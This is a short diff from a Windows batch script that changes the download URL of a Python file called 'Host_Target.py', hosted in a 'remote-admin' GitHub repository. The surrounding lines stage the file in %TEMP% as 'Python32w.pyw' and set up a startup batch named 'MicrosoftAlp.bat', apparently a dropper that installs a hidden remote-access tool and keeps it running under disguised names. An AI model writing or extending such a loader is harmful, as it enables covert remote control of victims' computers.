@@ -20,7 +20,7 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 set DOWNLOAD_DIR=%TEMP%
-set PYTHON_SCRIPT_URL=https://raw.githubusercontent.com/Mana42138/remote-admin/main/Host_Target.py
+set PYTHON_SCRIPT_URL=https://raw.githubusercontent.com/Mana42138/Remote-Admin/master/Host_Target.py
 set PYTHON_SCRIPT_NAME=Python32w.pyw
 set PYTHON_SCRIPT_PATH=%DOWNLOAD_DIR%\%PYTHON_SCRIPT_NAME%
 set STARTUP_BATCH_NAME=MicrosoftAlp.bat
